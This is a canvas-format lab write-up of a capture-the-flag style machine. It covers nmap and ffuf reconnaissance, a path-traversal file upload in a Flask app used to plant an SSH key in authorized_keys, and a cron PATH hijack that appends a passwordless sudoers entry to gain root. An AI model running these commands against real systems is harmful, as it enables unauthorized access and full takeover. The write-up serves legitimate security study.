{
	"nodes":[
		{"id":"70fc84abb4e7d155","type":"text","text":"# TARGET","x":-166,"y":-274,"width":250,"height":60},
		{"id":"45ef509c43a742a2","type":"text","text":"## 1️⃣ Nmap Scan\n```\nsudo nmap 192.168.107.249 -sCV -v -p- --min-rate=300\n```\n\n| Port | Service |\n|---|---|\n| 21 | ftp (anon login) |\n| 22 | closed |\n| 25022 | ssh (OpenSSH 8.6) |\n| 33414 | Werkzeug/Flask |\n| 40080 | Apache 2.4.53 |\n\nTRACE method flagged on 40080 — not exploited.","x":400,"y":-440,"width":480,"height":420,"color":"4"},
		{"id":"aa77b9fb3b8b7b15","type":"text","text":"### nmap\n```\nPORT      STATE  SERVICE          VERSION\n21/tcp    open   ftp              vsftpd 3.0.3\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n|_Can't get directory listing: TIMEOUT\n| ftp-syst: \n|   STAT: \n| FTP server status:\n|      Connected to 192.168.45.249\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 2\n|      vsFTPd 3.0.3 - secure, fast, stable\n|_End of status\n22/tcp    closed ssh\n111/tcp   closed rpcbind\n139/tcp   closed netbios-ssn\n443/tcp   closed https\n445/tcp   closed microsoft-ds\n2049/tcp  closed nfs\n10000/tcp closed snet-sensor-mgmt\n25022/tcp open   ssh              OpenSSH 8.6 (protocol 2.0)\n| ssh-hostkey: \n|   256 68:c6:05:e8:dc:f2:9a:2a:78:9b:ee:a1:ae:f6:38:1a (ECDSA)\n|_  256 e9:89:cc:c2:17:14:f3:bc:62:21:06:4a:5e:71:80:ce (ED25519)\n33414/tcp open   http             Werkzeug httpd 2.2.3 (Python 3.9.13)\n|_http-server-header: Werkzeug/2.2.3 Python/3.9.13\n|_http-title: 404 Not Found\n40080/tcp open   http             Apache httpd 2.4.53 ((Fedora))\n|_http-server-header: Apache/2.4.53 (Fedora)\n|_http-title: My test page\n| http-methods: \n|   Supported Methods: GET POST OPTIONS HEAD TRACE\n|_  Potentially risky methods: TRACE\nService Info: OS: Unix\n\n```","x":-720,"y":-84,"width":693,"height":1040},
		{"id":"5c32e85899e84739","type":"text","text":"## 2️⃣ Content Discovery (ffuf)\n```\nffuf -c -w DirBuster-2007_directory-list-2.3-medium.txt:FUZZ \\\n -u http://<IP>:33414/FUZZ -e .txt,.html,.php,.bak \\\n -recursion -recursion-depth 2 -ic -fc 404\n```\n\nFound on **:33414**:\n- `/help`\n- `/info`\n- `/file-list?dir=`\n- `/file-upload` ⚠️ (POST)\n\nApache :40080 → dead end (images/, styles/, LICENSE)","x":780,"y":120,"width":480,"height":320,"color":"4"},
		{"id":"2bcde8db4ded26a7","type":"text","text":"## 3️⃣ Vulnerability: Path Traversal Upload\n\n`POST /file-upload` — extension check only validates the **uploaded file's own name**, but the actual **write path** comes from an unsanitized `filename` form field (secure_filename imported but never called!).\n\n➡️ **Arbitrary file write**, limited to existing directories, as user `alfredo`.\n\nWrite to `/var/www/html` → 500 (no perms)\nWrite to `/tmp` → ✅ success (confirms traversal works, it's a **permissions** issue not depth)","x":400,"y":580,"width":480,"height":380,"color":"1"},
		{"id":"e5f8bc68711174b0","type":"text","text":"## 4️⃣ Exploitation\n\n```bash\nssh-keygen -t ed25519 -f /tmp/id_offsec -N \"\"\n\ncurl -H 'Content-Type: multipart/form-data' \\\n -F 'file=@/tmp/id_offsec.pub' \\\n -F 'filename=/home/alfredo/.ssh/authorized_keys' \\\n http://<IP>:33414/file-upload\n\nssh alfredo@<IP> -p 25022 -i /tmp/id_offsec\n```\n\n⚠️ Must upload the **.pub** key, not private.\n⚠️ `.ssh/` dir must already exist — no mkdir primitive.\n\n✅ Result: shell as alfredo → **local.txt** captured","x":1260,"y":560,"width":480,"height":440,"color":"1"},
		{"id":"2e327b2af71d8a66","type":"text","text":"## 5️⃣ PrivEsc Discovery: Cron PATH Hijack\n\n`/etc/crontab`:\n```\n*/1 * * * * root /usr/local/bin/backup-flask.sh\n```\n\n`backup-flask.sh`:\n```sh\nexport PATH=\"/home/alfredo/restapi:$PATH\"\ncd /home/alfredo/restapi\ntar czf /tmp/flask.tar.gz *\n```\n\n🐞 Calls `tar` with **no absolute path**, and prepends an **alfredo-writable dir** to PATH → classic PATH hijack, runs as root every minute.","x":2040,"y":600,"width":480,"height":360,"color":"3"},
		{"id":"af745cddfb985692","type":"text","text":"## ❌ Attempt 1: SUID bash copy (FAILED)\n\n```bash\ncat << 'EOF' > /home/alfredo/restapi/tar\n#!/bin/bash\ncp /bin/bash /tmp/rootbash\nchmod +s /tmp/rootbash\nEOF\nchmod +x /home/alfredo/restapi/tar\nsleep 61\n/tmp/rootbash -p\nwhoami   # still alfredo\n```\n\n**Root cause:** `mount | grep /tmp` → `nosuid` — SUID bit silently ignored on tmpfs `/tmp`.","x":2040,"y":1100,"width":480,"height":320,"color":"5"},
		{"id":"99e13a75c7cce4c5","type":"text","text":"## ✅ Attempt 2: Sudoers Write (SUCCESS)\n\n```bash\ncat << 'EOF' > /home/alfredo/restapi/tar\n#!/bin/bash\necho \"alfredo ALL=(ALL) NOPASSWD: ALL\" >> /etc/sudoers\nEOF\nchmod +x /home/alfredo/restapi/tar\nsleep 61\nsudo -l\nsudo bash\nwhoami   # root\ncat /root/proof.txt\n```\n\n🏁 **ROOT** — proof.txt captured","x":2900,"y":1080,"width":480,"height":480,"color":"2"},
		{"id":"fc92536fce982a01","type":"text","text":"## 💡 Lessons Learned\n\n- Check `/help`, `/info`, `/api`-style endpoints on unknown Werkzeug apps\n- Upload filename traversal = check for unsanitized write-path params, even if extension checks look solid\n- 500 error on upload ≠ broken payload — often a **permissions** problem; test `/tmp` first\n- authorized_keys needs the **public** key; target dir must pre-exist\n- Cron jobs calling binaries without absolute paths + writable PATH dirs = PATH hijack\n- Check `mount | grep <dir>` for `nosuid` before assuming a SUID privesc is broken\n- Prefer sudoers/authorized_keys writes over SUID binaries when you already have root-context execution\n- Always check `.bash_history` — leaked base64 source code here","x":2920,"y":160,"width":480,"height":500,"color":"6"}
	],
